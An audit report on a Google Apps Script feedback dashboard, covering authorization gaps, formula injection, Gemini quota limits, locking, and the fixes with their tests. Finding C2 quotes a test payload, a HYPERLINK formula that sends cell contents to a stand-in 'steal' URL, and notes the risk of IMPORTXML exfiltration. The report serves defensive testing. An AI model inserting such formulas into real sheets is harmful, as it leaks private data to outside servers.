# PGN Feedback & Accountability Hub — Master Audit Report

**Date:** 2026-10-11
**Scope:** `Code.gs`, `Index.html`, `README.md`, `TEST_PLAN.md`, `CLAUDE_MASTER_AUDIT.md` (the `PGN_Final_Review_Package.zip` as supplied).
**Method:** Full source read of every file, static analysis (`node --check`), a synthetic unit/integration suite that runs the real `Code.gs` against mocked Google services (41 scenarios), and a browser pass of the real `Index.html` driving the real backend logic through a `google.script.run` emulator. No Google account, Sheet, Form, trigger, or Gemini key was used. Nothing in this report contains real member feedback or secrets.

Line numbers below refer to the **original** files as supplied (they are double-spaced; numbers match what you see in those files). All findings marked **Fixed** are implemented in the corrected `Code.gs` and `Index.html` in this package.

---

## 1. Summary

| Severity | Found | Fixed in code | Mitigated by docs/config only |
|----------|-------|---------------|-------------------------------|
| Critical | 3 | 3 | 0 |
| High | 9 | 9 | 0 |
| Medium | 14 | 14 | 0 |
| Low | 7 | 7 | 0 |
| Informational (platform limits) | 8 | — | 8 |

The original code was functionally close to working, but it had no server-side authorization at all, an unreliable (and text-corrupting) formula-injection guard, an O(N) per-row read loop in the grouping sync, grouping that ran outside the lock, a timezone bug in the date filters, and several silent-loss paths for submissions. The architecture also relied on runtime monkey-patching in both files (three overlapping dashboard scripts and a reassigned `analyzeFeedbackWithGemini`). Everything has been consolidated into one backend file with a single public surface and one dashboard script.

**Production go/no-go:** see §7.

---

## 2. Critical

### C1. No server-side authorization; every global function is a remote endpoint
- **Where:** `Code.gs` — `doGet` (1476–1483) and every top-level `function` (e.g. `updatePGNIssue` 1860, `pgnMergeRecurringGroups` 2837, `testSaveGeminiIssues` 1365, `analyzeFeedbackWithGemini` 211/2403).
- **Problem:** Access depended entirely on the deployment setting "Only myself". Apps Script exposes *every* non-underscore global function to `google.script.run`. The moment the deployment is widened (even by accident to "Anyone in domain"), any caller could read all feedback, write notes, merge groups, run `testSaveGeminiIssues` (writes demo rows into live data), or call `analyzeFeedbackWithGemini` directly to burn the Gemini quota.
- **Fix:** `pgnAssertAuthorized_()` runs first in every remotely callable function and in `doGet` (which now renders an "Access denied" page instead of the dashboard). The caller must be the script owner or listed in Script Property `PGN_ALLOWED_EMAILS`. Blank caller identity is denied by default (fail closed); `PGN_ALLOW_BLANK_CALLER=true` is a documented escape hatch for "Only myself" deployments only. All 44 helpers are now `name_()` (private, unreachable remotely). Verified by tests 9.3 and 9.4 and in the browser (refresh as a non-allowlisted account → "Not authorized").
- **Residual risk:** Under "Execute as Me", Google hides the active user's email for accounts outside the owner's domain, which is why the check fails closed. See `SECURITY_PRIVACY.md` §2 for the exact behaviour and how to verify it live.

### C2. Formula-injection guard was unreliable and corrupted original text
- **Where:** `safeText` 473–485, `pgnSafeCell` 1674–1683; used at 679–687 (issue rows), 1984 (action notes), 2150 (corrections); `setNumberFormat("@")` at 705–711.
- **Problem:** The guard prefixed an apostrophe to text starting with `= + - @`. On columns already formatted as plain text ("@") the apostrophe is stored **literally**, so a member who writes "- Dues are high" or "+1 to more speakers" gets their text changed (violating "preserve genuine original issue text"). On the other sheets (action log, corrections via `appendRow`) the apostrophe route relies on undocumented parsing behaviour. A formula such as `=IMPORTXML(...)` that does get evaluated inside the private sheet can exfiltrate neighbouring cells to a third-party server when the President opens the Sheet.
- **Fix:** All user-supplied text (feedback type, summary, original text, notes, correction summaries, group titles) is written through `pgnWriteRows_()` as `RichTextValue` plus "@" format. Rich text can never be a formula and the text is stored byte-for-byte. Test 9.1 writes `=HYPERLINK("https://example.invalid/steal?"&A1,"click")`, `+1 ...` and `=1+1 ...` through every write path and asserts no cell became a formula and no apostrophe was added.

### C3. Uncontrolled Gemini cost/quota and no resilience
- **Where:** `analyzeFeedbackWithGemini` 211–465 and its override 2403–2662; `generatePGNLeadershipBrief` 2868–2914.
- **Problem:** No retry on 429/5xx (a transient Gemini hiccup turned a submission into "AI Failed"), no daily cap (a member spamming the public Form could run up unlimited paid calls), no feedback-length cap, each dashboard click on "Generate Leadership Brief" was a fresh paid call, and the override hard-coded the model URL (2538) instead of using `CONFIG.MODEL`.
- **Fix:** One transport `pgnCallGemini_()` with: 3 attempts with backoff on 429/500/502/503/504 and network errors; a daily budget in Script Properties (`CONFIG.GEMINI_DAILY_CALL_LIMIT`, override `PGN_GEMINI_DAILY_LIMIT`) after which submissions are preserved as "AI Failed" for manual review; `CONFIG.MAX_AI_FEEDBACK_CHARS` (8000); structured output via `responseSchema`; `systemInstruction` separation; brief results cached for 10 minutes per identical context. Tests 2.1–2.5, 7.3.

---

## 3. High

### H1. N+1 Sheets reads and per-row writes in the grouping sync
- **Where:** `syncRecurringIssues` 972 (`issuesSheet.getRange(index + 2, 14).getValue()` inside the per-issue loop), 1076–1083 (per-assignment `setValue`), 1160–1170 (per-group `setValues`); `pgnRecalculateGroupCounts` 2810–2815; `pgnMergeRecurringGroups` 2851–2858 (three writes per moved row, including rewriting the N1 header every iteration).
- **Impact:** With 1,000 issues the sync made 1,000+ read calls and could exceed the 6-minute trigger limit; every form submission ran it.
- **Fix:** `pgnSyncRecurringIssues_()` reads A:N once, writes new groups in one call, writes column M in one call, and writes E:G for all groups in one call. Test 10.1 seeds 1,000 issues and asserts ≤ 6 reads and ≤ 6 writes for the whole sync (measured: well under; runs in milliseconds).

### H2. Lock discipline was broken
- **Where:** `updatePGNIssueCategory` 2183–2203 (comment "Grouping takes its own lock" is false — `syncRecurringIssues` 884 never acquires one); `pgnSetIssueRecurringGroup` 2786 and `pgnMergeRecurringGroups` 2862 call `pgnRecalculateGroupCounts` **after** releasing their lock, so a form submission can interleave between the move and the recount.
- **Fix:** `pgnWithLock_()` wraps each public mutation once; internal `_` functions assume the lock and never acquire it. The mock lock throws on nested acquisition, so every test run also proves no function double-locks. Lock contention now returns a friendly "busy, try again" error (test 10.2) instead of a raw exception.

### H3. Date filters used the UTC calendar date
- **Where:** `Index.html` 1504 (`(issue.date || "").slice(0, 10)`) compared against `<input type="date">` values.
- **Impact:** A submission at 9 pm Eastern on 29 Sep is 30 Sep in UTC; "Submitted on or before 29 Sep" excluded it. Verified in the browser: the same dataset returned 5 rows with the fix and would have returned 3 with the UTC comparison.
- **Fix:** `localDateKey()` converts to the viewer's local calendar date.

### H4. Submission ID collisions silently dropped submissions
- **Where:** `processFormSubmission` 1273–1278 (`"PGN-" + (row − 1)`) with the dedupe at 563–583 (ID-only).
- **Impact:** If anyone deletes a row from `Form Responses 1`, every later row shifts; the next submission reuses an existing ID and `saveIssues` treats it as "already processed" — **lost with no error**.
- **Fix:** Dedupe compares the stored timestamp; a true replay is skipped, a collision gets a unique suffixed ID (`PGN-0005-20261001213000`) and is saved. `pgnReprocessMissingSubmissions()` scans the response sheet for rows with no issue rows and ingests them (capped per run). Tests 1.3, 1.4, 1.9.

### H5. Edited form question titles threw and lost the submission
- **Where:** 1250–1257 (`throw new Error("Google Forms question headers do not match CONFIG.")`).
- **Fix:** Headers are matched after trimming/case-folding; if the feedback column still cannot be found, the longest text cell is stored as a single "Header Mismatch" issue (Uncategorized, never auto-grouped, no AI call) so the President sees it in the Review Queue. Test 1.7.

### H6. Monkey-patching in both files (and a lost safety guard)
- **Where:** `Code.gs` 2403 (`analyzeFeedbackWithGemini = function…` reassigning a hoisted declaration; duplicate prompt, duplicate validation, hard-coded model); `Index.html` 2527–2591 (`loadData` replaced — and the replacement **dropped** the `google.script.run` existence guard at 1313–1321, so opening the file outside Apps Script threw), 2672–2705, 2710–2799, 2807–2879 (five render functions re-wrapped at runtime; DOM re-queried by index to attach buttons).
- **Fix:** One backend implementation per concern; one dashboard IIFE. The old entry point `getPGNManagementDataV2` is kept as a thin alias so a stale deployed dashboard keeps working until redeployed.

### H7. Leadership brief could crash or assert outcomes
- **Where:** 2906–2912 (`JSON.parse(json)` unguarded; `parsed[k]` on a non-object throws `TypeError` to the client), no "zero actions" guarantee beyond prompt wording, oldest-20 issues by sheet order (2872), no cache.
- **Fix:** Parse guarded with clear messages; `actions` is **forced** to "No leadership actions have been recorded for this group yet." when there are no active notes (test 7.1 feeds a model answer claiming completion and asserts it is overridden); newest 20 complaints; only summaries and dates sent (no original text, no IDs — test 7.2); deleted notes verified absent from the request payload (test 7.2 and browser check); 10-minute cache.

### H8. Merges left no audit trail and could resurrect merged topics
- **Where:** 2837–2864; `getPGNManagementDataV2` 2751 hid any group with 0 reports, so the merged source and its notes vanished from the UI; `syncRecurringIssues` keyed groups by title, so the next matching submission re-created the merged title as a new group.
- **Fix:** Source status becomes `Merged`, its Description gets "Merged into GRP-xxxx on yyyy-mm-dd", a system note is appended to the target's action log, the source's own notes stay attached to it, the sync redirects the merged title key to the surviving group, and the dashboard lists archived groups with their notes. Assigning to or editing a merged group is rejected. Test 4.3 and browser merge check.

### H9. Dashboard reads performed writes
- **Where:** `pgnPrepareActionDeletion` 2707–2715 rewrote F1:I1 (values, bold, colours) on **every** `getPGNManagementDataV2` call (2743).
- **Fix:** `pgnEnsureSheet_()` only fills blank header cells; reads never write (test 10.1 asserts zero writes during load).

---

## 4. Medium

| # | Finding | Where (original) | Fix |
|---|---------|------------------|-----|
| M1 | Correction examples selected on **any** single shared non-stop-word (`overlap > 0`), so "events" alone pulled unrelated examples; two contradictory corrections with identical wording were both sent. | 2389–2395 | Requires ≥2 shared keywords or ≥50 % of the example's keywords; identical wording collapses to the newest decision; larger stop-word list. Test 3.3. |
| M2 | Exact-substring check rejected the whole submission (→ "AI Failed") when the model normalised a curly quote or whitespace; duplicate excerpts were stored twice. | 423–433, 2620–2634 | `pgnLocateExcerpt_()` maps normalised excerpts back to the exact original span; duplicate excerpts dropped; coverage % logged. Tests 1.5, 1.11. |
| M3 | Rule-based fallback used substring matching: "intern" matched "internal", "cost" matched "costume". | 151–156 | Whole-word regexes with optional plural. Test 1.10. |
| M4 | Keyboard/screen-reader access: table rows clickable only by mouse; detail-page `<label>`s not associated; filter controls unlabeled; `confirm()`/`alert()` dialogs. | `Index.html` 1557–1589, 1676–1731, 1778–1797, 1958, 2290/2300, 2837–2839, 911–972, 2595–2647 | Rows are focusable (`tabindex=0`, Enter/Space) and carry a real link; every control has an associated label or `aria-label`; two-step inline confirmations; focus moves to the page heading; `aria-live` status; skip link; `aria-current` on nav. Verified in browser. |
| M5 | "Needs Review" stat (1403–1411) and Review Queue (1743–1755) used different predicates. | `Index.html` | One predicate (`needsReview`); stat renamed "Review Queue". |
| M6 | `Deleted By` stored a constant label (2729). | `Code.gs` | Stores the signed-in email when Google exposes it, otherwise the label; documented as not a strong identity. |
| M7 | `testSaveGeminiIssues` wrote "AI-DEMO-001" into live data with no guard. | 1365–1405 | Requires `PGN_ALLOW_DEMO_WRITES=true`; uses a unique timestamped ID. |
| M8 | Double-click / retry on "Save Action Note" could create duplicates. | 1915–2003 | Optional `clientToken`; same token within an hour returns the original log ID (test 5.1). |
| M9 | Category comparisons were case-sensitive; a manual sheet edit ("finance") broke grouping, assignment and merge checks. | 2776, 2846, 975 | `pgnNormalizeCategory_()` everywhere (test 8.1). |
| M10 | File header claimed Gemini was disabled by default; `getDashboardData` duplicated the loader; `getPGNManagementDataV2` read the log sheet twice. | 33–37, 1486–1581, 1758/2746 | Corrected comments; single loader `pgnLoadManagementData_()`. |
| M11 | Hard-coded notice "Current records include fictional testing submissions". | `Index.html` 1142–1151 | Neutral notice. |
| M12 | Group priority/status update had no archived-group check and no flush. | 2820–2834 | Added. |
| M13 | Brief used the first 20 issues in sheet order rather than the newest. | 2872 | Newest 20. |
| M14 | AI failure logging dropped the cause. | 605–611 | Logs the error message (status/finishReason) — never the feedback text (test 2.6 asserts no feedback or key in logs). |

---

## 5. Low

| # | Finding | Fix |
|---|---------|-----|
| L1 | No browser back/forward or deep links (SPA with no routing). | Hash routes `#complaints`, `#issue/<id>`, `#group/<id>`; verified back navigation in browser. |
| L2 | No way to see the full submission from the dashboard, so dropped concerns were invisible. | "View full submission" (`getPGNSubmissionText`) with shifted-row detection. |
| L3 | Group-assignment select only listed groups with reports > 0 (an issue could not be re-attached to an emptied group). | Lists all active groups; archived ones shown disabled. |
| L4 | Action Log page entries did not link to their records. | Record IDs are links. |
| L5 | Muted text `#777` was below WCAG AA for small text. | `#666`; column headers 11 px. |
| L6 | Date-range inputs split across two layouts with an unlabeled first input. | Grouped secondary filter row with labels and a Reset button. |
| L7 | No "processing method" filter although "AI Failed" rows need attention. | Added filter; Review Queue shows the method column. |

---

## 6. Informational — cannot be fixed in code (documented in `SECURITY_PRIVACY.md` / `SETUP.md`)

1. **Anonymity is a Form setting, not a code property.** "Collect email addresses" and "Limit to 1 response" must stay off; timestamps and writing style remain quasi-identifiers.
2. **Gemini data use.** On the Gemini API free tier Google may use prompts to improve its products; on paid tier it does not. Member feedback is sent to Google either way. Members should be told in the Form description.
3. **Script Properties are readable by anyone with edit access to the spreadsheet** (bound scripts share the Sheet's editors). Keep the Sheet owner-only.
4. **Consumer-account quotas:** 90 min/day trigger runtime, 20,000 URL fetches/day. Roughly 300–500 submissions/day is the practical ceiling with AI enabled.
5. **`Session.getActiveUser()` returns blank for non-domain users under "Execute as Me".** The authorization layer therefore fails closed; the deployment access setting remains the primary control.
6. **Model availability.** `gemini-3.1-flash-lite` on the `v1beta` endpoint could not be verified offline. `GEMINI_MODEL` Script Property overrides it without a code change.
7. **Direct sheet edits bypass every validation.** Apps Script cannot prevent the owner from editing cells. Optional sheet protection is described in `SETUP.md`.
8. **Trigger failure e-mails.** Google e-mails the owner when a trigger throws; the recovery function exists for that case.

---

## 7. Go / No-Go

**Recommendation: GO for a controlled rollout under "Execute as Me / Only myself", after the live verification steps in `TEST_RESULTS.md` §3 pass.** Specifically, before announcing the Form to members:

1. Deploy, open the dashboard as the President, confirm `getPGNSessionInfo` reports the President's email (footer shows "Signed in as …"). If it shows "Not authorized", follow `SETUP.md` §6.
2. Submit two synthetic Form responses and confirm rows, groups, and the dashboard update.
3. Run `testPGNAuthorization` and the Gemini smoke test `testStructuredGemini` from the editor.
4. Confirm Form settings (no email collection).

**No-Go conditions:** widening web app access beyond "Only myself" without first completing the live authorization test with a second account; running on the Gemini free tier with real feedback if the chapter has not consented to third-party processing.

---

## 8. Files changed

| File | Status |
|------|--------|
| `Code.gs` | Rewritten and consolidated (all functionality preserved; 30 public functions, 44 private helpers). |
| `Index.html` | Rewritten as one script; branding, logo, copy and layout preserved. |
| `README.md` | Updated. |
| `TEST_PLAN.md` | Updated with automated coverage and live-test scripts. |
| `SETUP.md`, `SECURITY_PRIVACY.md`, `AUDIT_REPORT.md`, `TEST_RESULTS.md`, `IMPROVEMENTS.md` | New. |
| `tests/apps-script-mocks.js`, `tests/run-tests.js`, `tests/synthetic-dataset.json`, `tests/build-preview.js`, `tests/serve.js` | New synthetic test harness (Node, no dependencies). |
| `CLAUDE_MASTER_AUDIT.md` | Unchanged. |
